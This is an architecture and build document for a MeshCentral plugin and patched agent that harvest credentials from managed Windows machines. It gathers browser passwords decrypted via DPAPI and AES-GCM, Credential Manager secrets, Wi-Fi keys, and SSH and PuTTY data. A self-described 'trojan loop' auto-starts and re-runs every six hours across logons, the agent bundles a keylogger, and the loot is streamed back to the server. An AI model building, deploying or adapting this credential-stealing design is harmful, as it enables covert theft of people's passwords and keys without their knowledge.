# Architecture

## Components

```
mesh-pwrecovery/
├── agent/
│   ├── ILibDuktape_PassRecover.h   # C module header (incl. worker entry point)
│   ├── ILibDuktape_PassRecover.c   # native credential recovery: sweep, DPAPI, AES-GCM, worker, pipe, ring, report, export
│   ├── ILibDuktape_Keylogger.{c,h} # the reference keylogger module (kept, so one agent carries both)
│   └── ILibDuktape_Commit.h        # build-info stub (upstream generates it from git)
├── modules_meshcore/
│   └── win-passwordrecovery.js     # agent tunnel module (protocol 18)
├── plugin/
│   └── mcpassrec-viewmode.js       # browser controller for the Passwords tab
├── scripts/
│   ├── patch_meshcentral.js        # idempotent MeshCentral server patch
│   └── patch_meshagent.js          # idempotent MeshAgent source patch (C module, ServiceMain, vcxproj, makefile)
├── binaries/
│   ├── MeshService.exe             # x86 agent with the credential recovery compiled in
│   └── MeshService64.exe           # x64 agent with the credential recovery compiled in
├── mcpassrec.js                    # plugin entry point (MeshCentral plugin API)
├── config.json                     # plugin manifest (Plugins page install URL)
├── install-pwrecovery.ps1          # server installer (local checkout or one-liner; Node 26 compat patches)
├── install-pwrecovery-agent.ps1    # agent binary installer (local checkout or one-liner)
└── docs/architecture.md
```

## Data flow

```
Interactive user session (console user)
    │  passrecover-worker — the agent's own exe relaunched as
    │  "MeshService.exe passrecover-worker" via CreateProcessAsUser on the
    │  console user's token (WTSQueryUserToken), environment from
    │  CreateEnvironmentBlock. Runs the credential sweep:
    │      - Chromium Login Data + Local State (DPAPI + AES-256-GCM)
    │      - Firefox logins.json
    │      - Windows Credential Manager (CredEnumerateW + DPAPI)
    │      - Wi-Fi (netsh wlan ... key=clear)
    │      - SSH keys / PuTTY sessions
    │  streams a JSONL result over \.\pipe\mcpassrec
    ▼
agent service (session 0)
    │  ILibDuktape_PassRecover: 2048-entry in-memory ring (live view)
    │  + rolling passrec-YYYY-MM-DD.jsonl report in the agent directory
    │  trojan loop: background thread re-runs the sweep every N minutes
    ▼
agents/meshcore.js  ── protocol 18 tunnel ──  meshrelay.js (desktop-rights check)
    │  win-passwordrecovery.js: tail / harvest / start / stop / state /
    │                           list / read / export / unsub
    ▼
MeshCentral server (authenticated relay, plain JSON over websocket)
    ▼
public/scripts/mcpassrec-viewmode.js  (CreateAgentRedirect, protocol 18)
    ▼
views/*.handlebars  page 62 (MainDevPassRecovery) — the "Passwords" tab
```

When the agent runs *in* an interactive session (run as a user, not a service)
the sweep runs in-process and the worker is never spawned; everything else
(ring, report, tunnel) is identical.

## What the sweep recovers

- **Chromium-family browsers** (Chrome, Edge, Brave, Vivaldi, Opera, Chromium,
  Ungoogled Chromium): each `%LOCALAPPDATA\<Browser>\User Data` root is opened.
  The per-profile encryption key is read from `Local State`
  (`os_crypt.encrypted_key`, the base64 `DPAPI:` payload is
  `CryptUnprotectData`-ed, stripping the `v10` prefix). Each `Login Data`
  SQLite row (origin URL, `username_value`, `password_value`) is then
  decrypted with **AES-256-GCM** (bcrypt authenticated cipher, AAD = `v10`).
  The SQLite file is walked with a tiny built-in b-tree walker — no SQLite
  dependency, so a locked/partially-written DB is handled gracefully.
- **Firefox**: `logins.json` from the active profile — hostname + username are
  always captured; the password is captured best-effort (NSS-encrypted values
  are surfaced as markers rather than guessed).
- **Windows Credential Manager**: `CredEnumerateW` (loaded dynamically from
  `credui.dll` — the header/lib are missing from some SDK installs); generic
  credentials' blobs are DPAPI-decrypted.
- **Wi-Fi**: `netsh wlan show profiles` + `show profile <name> key=clear`.
- **SSH / PuTTY**: inventory of `~/.ssh` key files; PuTTY saved sessions from
  the registry.

Everything is emitted as JSONL — one credential per line:

```
{"ts":"2026-11-13 23:41:02","source":"browser","app":"Chrome","origin":"https://github.com/","user":"you","password":"...","extra":""}
```

`source` is one of `browser`, `firefox`, `credman`, `wifi`, `ssh`, `putty`;
`app` names the concrete browser / tool.

## Native module design

- **Singleton** (`g_pr`): a process-wide singleton, like the reference
  keylogger — state survives Duktape engine restarts; no finalizer needed.
- **Session 0 problem**: a MeshAgent *service* runs in session 0, which cannot
  see the console user's DPAPI master key or `%LOCALAPPDATA%`. So the agent
  spawns the same executable as `passrecover-worker` in the interactive
  session (`CreateProcessAsUserW` on a duplicated console token from
  `WTSQueryUserToken`, with the user's environment from
  `CreateEnvironmentBlock` — the worker needs `LOCALAPPDATA`/`APPDATA`/the
  user's DPAPI). The worker dies on logoff; the agent re-spawns it on the next
  logon / user switch with backoff, so the sweep runs 24/7 across sessions.
- **Result pipe**: `\\.\pipe\mcpassrec` is created by the agent with an
  explicit ACE for `Everyone` (a SYSTEM-owned pipe is not writable from a
  medium-integrity user session by default — error 5). The worker writes the
  JSONL and exits; the agent reads until EOF.
- **Dynamic API loading**: the authenticated-cipher bcrypt entry points
  (`BCryptDestroyAlgorithm`, `BCryptInitAuthMode`,
  `BCryptInitializeAuthenticationCipher`) and `CredEnumerateW` are resolved
  with `GetProcAddress`, because reduced BuildTools-only SDK installs ship a
  `bcrypt.h`/`bcrypt.lib` without them. The module therefore links and runs on
  any Windows 8+ machine regardless of SDK.
- **Files**: the rolling report is date-named (`passrec-YYYY-MM-DD.jsonl`),
  appended, flushed per line, in the agent directory. File names are validated
  strictly before any path use. `export()` re-renders the current report as
  `passrec-export-<stamp>.csv|json|html` next to it.
- **Non-Windows**: functional stub so `require('passrecover')` behaves the
  same on Linux/macOS builds (`getState().available === false`).

## JavaScript API (require('passrecover'))

| Call | Result |
| --- | --- |
| `harvest()` | run a sweep now; `{ ok, added, total, error? }` |
| `start({ intervalMinutes? })` | trojan loop: sweep now, then every N min (default 360) |
| `stop()` | stop the periodic loop |
| `getState()` | `{ available, session0, totalCreds, bufferCount, dir, currentFile, lastHarvest, lastError, running, intervalMinutes }` |
| `read(maxLines=0)` | drain up to N pending ring entries (0 = all), oldest first |
| `listFiles()` | `[{ name, size, mtime }]` for `passrec-*` files, newest first |
| `readFile(name, offset, maxBytes)` | `{ data (base64), size, bytes, offset, done }` |
| `export(fmt)` | `fmt = 'csv' \| 'json' \| 'html'`; writes a report file, `{ name, size }` |

The module auto-starts the periodic sweep at agent load on Windows
(`win-passwordrecovery.js` calls `start({ intervalMinutes: 360 })` at
require-time), so nothing else is needed after an agent update/reinstall.

## Tunnel protocol (18)

Agent → browser messages: `state`, `files`, `creds { lines: [...] }`,
`harvested { ok, added, total, error }`, `exported { name, size }`,
`filechunk { file, offset, size, bytes, data, done }`, `error`.
Browser → agent commands: `tail`, `unsub`, `harvest`, `start { opts }`,
`stop`, `state`, `list`, `read { file, offset, max }`, `export { fmt }`.

- The agent drains **all** pending ring entries per 250 ms tick (agent timers
  can coalesce) and applies backpressure via `ws.write === false` + `drain`.
- File reads are sequential 64 KB chunks (1 MB max), base64-encoded.
- The relay rights check requires the same desktop rights as audio (15) /
  keylogger (17): admin, or remote-control/view without the no-desktop flag.

## Server patch points (all idempotent)

1. `meshrelay.js` — `isProtocolAllowedByRights`: allow protocol 18 only with
   desktop rights (mirrors protocols 15/17).
2. `agents/meshcore.js`
   - tunnel dispatch: `else if (this.httprequest.protocol == 18)` branch
     (rights check, `descriptorMetadata = "Remote Password Recovery"`,
     `require("win-passwordrecovery").handleTunnelData(this, data)`).
   - `onTunnelClosed`: stop the forward timer.
   - auto-start: `if (process.platform == 'win32') require('passrecover').start({intervalMinutes: 360})`
     after `var promise = require('promise');`.
3. `views/default.handlebars` + `views/default3.handlebars`
   - script include for `mcpassrec-viewmode.js`;
   - top bar `Passwords` tab (go(62));
   - panel map entry `62: 'MainDevPassRecovery'`; loop `i < 63`;
   - submenu/tab-group/shift-click/URL ranges extended to include 62;
   - `p62` page markup;
   - `go()` lifecycle: `passRecTabEnter()` / `passRecTabExit()`.

In addition, `install-pwrecovery.ps1` applies **Node.js ≥ 26 compatibility
patches** to the installed `node_modules` tree (idempotent,
`.bak-mcpassrec` backups; must be re-applied after any MeshCentral upgrade):

- `node_modules/fd-slicer/index.js` (×2) — on Node ≥ 26 the readable-stream
  internals changed: `destroyed` is backed by stream state and streams are
  auto-destroyed right after `end`. yauzl (used for the plugin zip) hung
  because the final partial chunk never drained and `end` never fired; the
  post-`end` auto-destroy also emitted a bogus `error`.
- `node_modules/meshcentral/pluginHandler.js` — the zip entry pointer advanced
  on the *source* stream's `end`, which fires before the write stream's buffer
  flushes, so the LAST file of a plugin zip could be extracted empty; it now
  advances on the write stream's `finish`.

## Agent patch points (patch_meshagent.js)

- `microscript/ILibDuktape_PassRecover.{c,h}` copied in (the keylogger module
  is copied too, so one agent carries both).
- `microscript/ILibDuktape_Commit.h` stub copied in — a fresh MeshAgent source
  zip lacks it and the build fails with "Cannot open include file".
- `microscript/ILibDuktape_ScriptContainer.c`: include +
  `ILibDuktape_PassRecover_Init(ctx)` (under `#ifdef WIN32`).
- `meshservice/ServiceMain.c`: includes for both worker headers (kills the
  C4013 implicit-extern warnings) and a `passrecover-worker` command-line
  branch — when the same exe is relaunched as
  `"<exe>" passrecover-worker`, `ILibDuktape_PassRecoverWorker_Run(argc, argv)`
  is called instead of normal agent/service startup. This is what lets one
  binary serve as both agent and user-session worker.
- All `meshservice`/`meshconsole` vcxproj files: ClCompile + ClInclude items.
- `makefile`: sources appended for non-Visual-Studio builds.

## Building the agent binaries

From a MeshAgent checkout with Visual Studio 2022 (v143) or newer:

```powershell
node scripts/patch_meshagent.js <path-to-MeshAgent>
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x64
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x86 /p:PlatformToolset=v143
```

- Use `/p:Platform=x86`, not `Win32` — the solution's x86 platform is named
  `x86`; otherwise MSBuild fails with MSB4126.
- Some BuildTools-only installs ship only the v143 toolset, in which case pass
  `/p:PlatformToolset=v143` for the x86 build too (otherwise MSB8020).
- The MeshAgent prebuild generates `microscript\ILibDuktape_Commit.h` and
  `MeshService.rc` from `git log -1`, and silently skips both if git is not on
  PATH. So the checkout must be a git repository with `git` on PATH; the
  `agent/ILibDuktape_Commit.h` stub makes a fresh zip buildable without git.

Outputs: `meshservice\Release\MeshService64.exe` and
`meshservice\Release\MeshService.exe`. Replace the files in `binaries/` and
push, then re-run the agent installer.
